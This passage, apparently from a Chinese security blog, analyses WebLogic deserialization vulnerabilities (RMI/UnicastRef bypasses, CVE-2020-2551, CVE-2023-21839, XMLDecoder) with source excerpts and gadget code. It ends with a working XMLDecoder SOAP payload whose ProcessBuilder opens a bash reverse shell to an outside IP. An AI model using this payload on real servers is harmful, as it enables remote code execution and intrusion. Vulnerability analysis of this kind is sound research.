+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RemoteObjectInvocationHandler没有readobject调用的是它的父类RemoteObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObject</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">................</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">....................................</span><br><span class="line">            ref.readExternal(in);</span><br><span class="line">        &#125;</span><br><span class="line">....................................</span><br><span class="line"><span class="comment">//UnicastRef</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ref = LiveRef.read(var1, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title">read</span><span class="params">(ObjectInput var0, <span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TCPEndpoint var2;</span><br><span class="line">        <span class="keyword">if</span> (var1) &#123;</span><br><span class="line">            var2 = TCPEndpoint.read(var0);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2 = TCPEndpoint.readHostPortFormat(var0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ObjID var3 = ObjID.read(var0);</span><br><span class="line">        <span class="keyword">boolean</span> var4 = var0.readBoolean();</span><br><span class="line">        LiveRef var5 = <span class="keyword">new</span> LiveRef(var3, var2, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (var0 <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            ConnectionInputStream var6 = (ConnectionInputStream)var0;</span><br><span class="line">            var6.saveRef(var5);</span><br><span class="line">            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                var6.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br><span class="line">        &#125;</span><br><span class="line">.................................................</span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">registerRefs</span><span class="params">(Endpoint var0, List&lt;LiveRef&gt; var1)</span> </span>&#123;</span><br><span class="line">        EndpointEntry var2;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            var2 = DGCClient.EndpointEntry.lookup(var0);</span><br><span class="line">        &#125; <span class="keyword">while</span>(!var2.registerRefs(var1));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h5 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h5><p>也可以直接反序列化UnicastRef对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Registry <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="keyword">int</span> port;</span><br><span class="line">    <span class="keyword">int</span> sep = command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br></pre></td></tr></table></figure>
+<p>也可以寻找RemoteObject的其他子类(反正调的是父类RemoteObject的readobject),如ReferenceWrapper_Stub</p>
+<h4 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h4><p>CVE-2020-2555 BadAttributeValueExpException+LimitFilter.toString()引起的任意方法调用<br>CVE-2020-2883 上面链子compare方法也能触发，改用PriorityQueue调用compare方法</p>
+<h2 id="RMI-IIOP"><a href="#RMI-IIOP" class="headerlink" title="RMI-IIOP"></a>RMI-IIOP</h2><p>RMI-IIOP 是 RMI 的一个扩展，使得 Java 程序可以与使用 CORBA（Common Object Request Broker Architecture）标准的其他语言编写的程序进行互操作。通过 IIOP 协议进行远程调用<br>Weblogic IIOP协议默认开启，跟T3协议一起监听在7001或其他端口。</p>
+<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建远程对象</span></span><br><span class="line">MyRemoteObject remoteObject = <span class="keyword">new</span> MyRemoteObject();</span><br><span class="line"><span class="comment">// 获取上下文</span></span><br><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;iiop://172.16.1.128:7001&quot;</span>); <span class="comment">//</span></span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"><span class="comment">// 绑定对象到JNDI</span></span><br><span class="line">ctx.rebind(<span class="string">&quot;myRemoteObject&quot;</span>, remoteObject);</span><br><span class="line"><span class="comment">// 远程查找对象</span></span><br><span class="line">MyRemoteObject remoteObj = (MyRemoteObject) ctx.lookup(<span class="string">&quot;myRemoteObject&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="IIOP反序列化漏洞"><a href="#IIOP反序列化漏洞" class="headerlink" title="IIOP反序列化漏洞"></a>IIOP反序列化漏洞</h3><p>可以看出在使用上RMI-IIOP和rmi没有太大的区别，那么RMI攻击注册端的思路是不是也可以使用</p>
+<h4 id="CVE-2020-2551"><a href="#CVE-2020-2551" class="headerlink" title="CVE-2020-2551"></a>CVE-2020-2551</h4><p>bind操作的时候会将被绑定的对象进行序列化并发送到IIOP服务端，在服务端进行反序列化</p>
+<p>在XXL-JOB我们分析过<code>org/springframework/jndi/JndiTemplate#lookup</code>是存在lookup利用点的,weblogic同样存在spring frame,所以可以利用JtaTransactionManager反序列化进行jndi</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JtaTransactionManager</span> <span class="keyword">extends</span> <span class="title">AbstractPlatformTransactionManager</span> <span class="keyword">implements</span> <span class="title">TransactionFactory</span>, <span class="title">InitializingBean</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">.........................................................</span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line">        <span class="keyword">this</span>.initUserTransactionAndTransactionManager();</span><br><span class="line">        <span class="keyword">this</span>.initTransactionSynchronizationRegistry();</span><br><span class="line">    &#125;</span><br><span class="line">.........................................................</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line">                <span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.retrieveUserTransaction();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">.........................................................</span><br><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.logger.debug(<span class="string">&quot;Retrieving JTA UserTransaction from JNDI location [&quot;</span> + userTransactionName + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (UserTransaction)<span class="keyword">this</span>.getJndiTemplate().lookup(userTransactionName, UserTransaction.class); <span class="comment">//getJndiTemplate获取JndiTemplate类</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>从CVE-2023-21839到CVE-2024-20931 rebind操作</p>
+<h4 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h4><p>当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在retVal = context.lookup(this.remoteJNDIName)实现，故可以通过rmi/ldap远程协议进行远程命令执行。</p>
+<h2 id="XMLDecoder反序列化"><a href="#XMLDecoder反序列化" class="headerlink" title="XMLDecoder反序列化"></a>XMLDecoder反序列化</h2><p>Weblogic组件使用了自带的webservices处理程序来处理SOAP请求。通过WLLServletAdapter类进行处理，在WorkContentServerTube类中处理POST数据包中传递的XML数据.</p>
+<p>即漏洞引发的原因是Weblogic wls-wsat组件在反序列化操作时使用了Oracle官方的JDK组件中XMLDecoder类进行XML反序列化操作引发了代码执行。也就说XMLDecoder类在解析XML文件的时候出现了反序列化问题<br>XMLDecoder反序列化</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &gt;&amp; /dev/tcp/192.168.111.178/6666 0&gt;&amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/java/"># java</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/11/05/java/ActiveMQ%20%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">ActiveMQ 利用分析</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
